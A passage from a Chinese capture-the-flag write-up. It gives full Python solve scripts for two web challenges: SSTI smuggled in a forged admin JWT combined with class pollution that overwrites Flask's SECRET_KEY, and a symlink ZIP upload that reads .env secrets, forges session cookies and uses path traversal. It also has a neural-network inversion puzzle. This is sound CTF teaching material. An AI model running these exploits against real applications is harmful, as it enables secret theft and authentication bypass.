等关键字拆成字符串拼接与 %c 生成，从而读取 /flag</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiaGVsbG8gKCgobGlwc3VtfGF0dHIoJ19fJyB-ICgnJWMnJTEwMykgfiAnbG9iYWxzX18nKSlbJ19fYnVpbCcgfiAndGluc19fJ11bJ28nIH4gJ3BlbiddKCcvJyB-ICdmbGEnIH4gKCclYyclMTAzKSkpfGF0dHIoJ3JlJyB-</span><br><span class="line">  ICdhZCcpKCkpIGhhY2tlciIsInJvbGUiOiJhZG1pbiJ9.scA4Rp1MLiXDPPu-ye8xGkgaBtC-HTJ2iILqY7mKoVQ</span><br></pre></td></tr></table></figure><p>这里 hello … hacker 在过滤后会变成 ，表达式利用 lipsum 的全局字典拿到 open(‘&#x2F;fla’ ~ ‘%c’%103) 并调用 read()。携带该令牌访问受保护接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://127.0.0.1:58379&quot;</span></span><br><span class="line">SECRET = <span class="string">&quot;mysecret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64url</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> base64.urlsafe_b64encode(data).rstrip(<span class="string">b&quot;=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造带有 SSTI 载荷的管理员 JWT</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">craft_token</span>(<span class="params">secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    header = &#123;<span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>, <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># 利用 hello/hacker 的替换逻辑，将表达式包裹成 &#123;&#123; ... &#125;&#125; 并读取 /flag</span></span><br><span class="line">    ssti_payload = (</span><br><span class="line">        <span class="string">&quot;hello (((lipsum|attr(&#x27;__&#x27; ~ (&#x27;%c&#x27;%103) ~ &#x27;lobals__&#x27;))[&#x27;__buil&#x27; ~ &#x27;tins__&#x27;]&quot;</span></span><br><span class="line">        <span class="string">&quot;[&#x27;o&#x27; ~ &#x27;pen&#x27;](&#x27;/&#x27; ~ &#x27;fla&#x27; ~ (&#x27;%c&#x27;%103)))|attr(&#x27;re&#x27; ~ &#x27;ad&#x27;)()) hacker&quot;</span></span><br><span class="line">    )</span><br><span class="line">    body = &#123;<span class="string">&quot;user&quot;</span>: ssti_payload, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    header_b64 = b64url(json.dumps(header, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode())</span><br><span class="line">    body_b64 = b64url(json.dumps(body, separators=(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>)).encode())</span><br><span class="line">    signing_input = header_b64 + <span class="string">b&quot;.&quot;</span> + body_b64</span><br><span class="line">    signature = b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())</span><br><span class="line">    <span class="keyword">return</span> (signing_input + <span class="string">b&quot;.&quot;</span> + signature).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 滥用 merge 合并漏洞覆盖 Flask SECRET_KEY</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poison_secret</span>(<span class="params">base_url: <span class="built_in">str</span>, new_secret: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;attacker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;__init__&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;__globals__&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;app&quot;</span>: &#123;</span><br><span class="line">                        <span class="string">&quot;config&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;SECRET_KEY&quot;</span>: new_secret,</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.trust_env = <span class="literal">False</span></span><br><span class="line">    resp = session.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/register&quot;</span>, json=payload, proxies=&#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">base_url: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    poison_secret(base_url, secret)</span><br><span class="line">    token = craft_token(secret)</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.trust_env = <span class="literal">False</span></span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;Bearer <span class="subst">&#123;token&#125;</span>&quot;</span>&#125;</span><br><span class="line">    resp = session.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/protected&quot;</span>, headers=headers, proxies=&#123;<span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125;)</span><br><span class="line">    resp.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = exploit(BASE_URL, SECRET)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">raise</span> SystemExit(<span class="string">f&quot;failed: <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013104959726.png" alt="image-20251013104959726"></p><p>TSCTF-J{y0u_c0mp1373d_7h3_py_pr0813m}!</p><h3 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h3><p>上传 ZIP 时使用系统 unzip，不会过滤符号链接，可在个人上传目录写入一个指向 &#x2F; 的软链接（示例命名为 root），随后通过 &#x2F;files&#x2F;root&#x2F;&lt;路径&gt; 访问宿主文件系统。</p><p>先访问 &#x2F;files&#x2F;root&#x2F;app&#x2F;.env 泄露 SESSION_SECRET，再读 &#x2F;files&#x2F;root&#x2F;app&#x2F;server.js 获取 store.set(‘…’) 中的开发者会话 UUID。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用 SESSION_SECRET 对该 UUID 计算 connect.sid（s:&lt;uuid&gt;.&lt;HMAC&gt;），设置此 cookie 并伪造请求头 X-Forwarded-For: 127.0.0.1，即可满足 developmentOnly 中“本地开发者”条件并访问 /debug/files。</span><br></pre></td></tr></table></figure><p>&#x2F;debug&#x2F;files 接受外部传入的 sessionId，缺乏路径限制。传入 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;.. 等遍历值即可列出真正的根目录，发现入口脚本随机生成的 8 位目录名。</p><p>最后再上传一个软链接（如 flag 指向 &#x2F;&lt;随机目录&gt;&#x2F;flag.txt），通过 &#x2F;files&#x2F;flag 成功读取 flag。</p><ol><li>上传带有符号链接的 ZIP，读取 &#x2F;app&#x2F;.env 和 &#x2F;app&#x2F;server.js，获取 SESSION_SECRET 与开发者会话 UUID。</li><li>使用密钥伪造 connect.sid，访问 &#x2F;debug&#x2F;files 并目录穿越枚举根目录，确定随机 flag 目录。</li><li>再次上传指向 flag.txt 的符号链接，通过 &#x2F;files&#x2F;flag 直接获取 flag。</li></ol><p>AI写脚本太强了 0.0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">BASE_URL = <span class="string">&quot;http://127.0.0.1:56046&quot;</span></span><br><span class="line">ROOT_HEADERS = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;solve.py&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_zip</span>(<span class="params">symlinks: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;构造包含符号链接的 ZIP 二进制数据。&quot;&quot;&quot;</span></span><br><span class="line">    buf = io.BytesIO()</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(buf, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> name, target <span class="keyword">in</span> symlinks.items():</span><br><span class="line">            entry = zipfile.ZipInfo(name)</span><br><span class="line">            entry.create_system = <span class="number">3</span>            <span class="comment"># 指定 *nix 平台，允许符号链接</span></span><br><span class="line">            entry.external_attr = <span class="number">0o120777</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">            zf.writestr(entry, target)</span><br><span class="line">    buf.seek(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> buf.getvalue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_zip</span>(<span class="params">sess: requests.Session, mapping: <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;上传符号链接 ZIP 到 /upload。&quot;&quot;&quot;</span></span><br><span class="line">    payload = build_zip(mapping)</span><br><span class="line">    files = &#123;<span class="string">&quot;zipfile&quot;</span>: (<span class="string">&quot;exploit.zip&quot;</span>, payload, <span class="string">&quot;application/zip&quot;</span>)&#125;</span><br><span class="line">    resp = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/upload&quot;</span>, files=files, headers=ROOT_HEADERS, allow_redirects=<span class="literal">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">302</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;上传 ZIP 失败，HTTP <span class="subst">&#123;resp.status_code&#125;</span>：<span class="subst">&#123;resp.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_named_file</span>(<span class="params">sess: requests.Session, name: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;通过 /files/&lt;name&gt; 读取文件内容。&quot;&quot;&quot;</span></span><br><span class="line">    resp = sess.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/files/<span class="subst">&#123;name&#125;</span>&quot;</span>, headers=ROOT_HEADERS, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;读取 <span class="subst">&#123;name&#125;</span> 失败，HTTP <span class="subst">&#123;resp.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_cookie</span>(<span class="params">value: <span class="built_in">str</span>, secret: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据 express-session 规则签名 connect.sid。&quot;&quot;&quot;</span></span><br><span class="line">    mac = hmac.new(secret.encode(), value.encode(), hashlib.sha256).digest()</span><br><span class="line">    sig = base64.b64encode(mac).decode().rstrip(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;s:<span class="subst">&#123;value&#125;</span>.<span class="subst">&#123;sig&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug_list</span>(<span class="params">dev_sess: requests.Session, session_id: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;访问 /debug/files 并解析返回的文件名列表。&quot;&quot;&quot;</span></span><br><span class="line">    headers = <span class="built_in">dict</span>(ROOT_HEADERS)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    params = &#123;<span class="string">&quot;sessionId&quot;</span>: session_id&#125;</span><br><span class="line">    resp = dev_sess.get(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/debug/files&quot;</span>, headers=headers, params=params, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> resp.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;/debug/files 访问失败，HTTP <span class="subst">&#123;resp.status_code&#125;</span>：<span class="subst">&#123;resp.text[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">r&#x27;&lt;li class=&quot;list-group-item&quot;&gt;\s*([^&lt;\s]+)&#x27;</span>, resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 0：初始化普通用户会话&quot;</span>)</span><br><span class="line">    user = requests.Session()</span><br><span class="line">    user.get(BASE_URL + <span class="string">&quot;/&quot;</span>, headers=ROOT_HEADERS, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 1：上传 env/server 符号链接 ZIP&quot;</span>)</span><br><span class="line">    upload_zip(user, &#123;<span class="string">&quot;env&quot;</span>: <span class="string">&quot;/app/.env&quot;</span>, <span class="string">&quot;server&quot;</span>: <span class="string">&quot;/app/server.js&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    env_content = fetch_named_file(user, <span class="string">&quot;env&quot;</span>)</span><br><span class="line">    match_secret = re.search(<span class="string">r&quot;SESSION_SECRET=(.+)&quot;</span>, env_content)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> match_secret:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未能在 .env 中找到 SESSION_SECRET&quot;</span>)</span><br><span class="line">    session_secret = match_secret.group(<span class="number">1</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] SESSION_SECRET = <span class="subst">&#123;session_secret&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    server_js = fetch_named_file(user, <span class="string">&quot;server&quot;</span>)</span><br><span class="line">    match_dev = re.search(<span class="string">r&quot;store\.set\(&#x27;([^&#x27;]+)&#x27;\s*,&quot;</span>, server_js)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> match_dev:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未能在 server.js 中找到开发会话 UUID&quot;</span>)</span><br><span class="line">    dev_session_id = match_dev.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 开发者会话 UUID = <span class="subst">&#123;dev_session_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 2：伪造 connect.sid 并访问 /debug/files&quot;</span>)</span><br><span class="line">    dev = requests.Session()</span><br><span class="line">    connect_sid = sign_cookie(dev_session_id, session_secret)</span><br><span class="line">    dev.cookies.<span class="built_in">set</span>(<span class="string">&quot;connect.sid&quot;</span>, connect_sid, domain=<span class="string">&quot;127.0.0.1&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    root_entries = debug_list(dev, <span class="string">&quot;../../../../..&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] 根目录条目：<span class="subst">&#123;root_entries&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    flag_dir = <span class="built_in">next</span>((name <span class="keyword">for</span> name <span class="keyword">in</span> root_entries <span class="keyword">if</span> re.fullmatch(<span class="string">r&quot;[a-z0-9]&#123;8&#125;&quot;</span>, name)), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag_dir:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未找到符合格式的 flag 目录名&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag 目录 = /<span class="subst">&#123;flag_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 步骤 3：上传指向 flag.txt 的符号链接并读取&quot;</span>)</span><br><span class="line">    upload_zip(user, &#123;<span class="string">&quot;flag&quot;</span>: <span class="string">f&quot;/<span class="subst">&#123;flag_dir&#125;</span>/flag.txt&quot;</span>&#125;)</span><br><span class="line">    flag_content = fetch_named_file(user, <span class="string">&quot;flag&quot;</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Flag = <span class="subst">&#123;flag_content&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 运行失败：<span class="subst">&#123;exc&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013105656157.png" alt="image-20251013105656157"></p><p>TSCTF-J{@r3-yOu-a_SYMboIIC-LiNK-m4St3R?274e7a}</p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="JustReverse"><a href="#JustReverse" class="headerlink" title="JustReverse"></a>JustReverse</h3><p>AI逆向题</p><p>可以看到原流程，把 flag 逐字符转成 8 位二进制 ，组成张量后，依次经过 conv1、conv2、linear、conv3，最后写成 ciphertext.txt。</p><p>因为 conv1 权重是 [1,2;4,8] 且 conv2 只有 0.5 的权重、正偏置，ReLU 永远不会把值裁掉，相当于把每 4 位二进制压成一个 0–15 的整数之后线性放大，对应关系可以反推。</p><p>关键是 model.pth 内已经存了所有权重，用 unzip + 伪造 torch 模块即可用 pickle 读出，再用 numpy 分别逆向：先从 ciphertext.txt 里减去 conv3.bias，按照卷积公式顺序解开 2×2 卷积；得到的 58×58 矩阵 reshape 成向量，减去 linear.bias，利用 np.linalg.lstsq 求解线性方程组拿回 conv2 的输出。</p><p>最后把线性层输出还原到 0–15 之间的数字，再根据 [1,2,4,8] 的系数拆回每 4 位二进制，合并为 flag 字符。整个过程就是顺序逆操作 + 线性求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile, pickle, types, sys, io</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">torch = types.ModuleType(<span class="string">&#x27;torch&#x27;</span>)</span><br><span class="line">sys.modules[<span class="string">&#x27;torch&#x27;</span>] = torch</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FloatStorage</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, size=<span class="number">0</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.size = size</span><br><span class="line"></span><br><span class="line">torch.FloatStorage = FloatStorage</span><br><span class="line">utils = types.ModuleType(<span class="string">&#x27;torch._utils&#x27;</span>)</span><br><span class="line">sys.modules[<span class="string">&#x27;torch._utils&#x27;</span>] = utils</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">default_stride</span>(<span class="params">size</span>):</span><br><span class="line">    acc = <span class="number">1</span></span><br><span class="line">    strides = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">reversed</span>(size):</span><br><span class="line">        strides.insert(<span class="number">0</span>, acc)</span><br><span class="line">        acc *= s</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(strides)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StorageWrapper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, array</span>):</span><br><span class="line">        <span class="variable language_">self</span>.array = array</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TensorWrapper</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, array</span>):</span><br><span class="line">        <span class="variable language_">self</span>.array = array</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_rebuild_tensor_v2</span>(<span class="params">storage_obj, storage_offset, size, stride, *_</span>):</span><br><span class="line">    size = <span 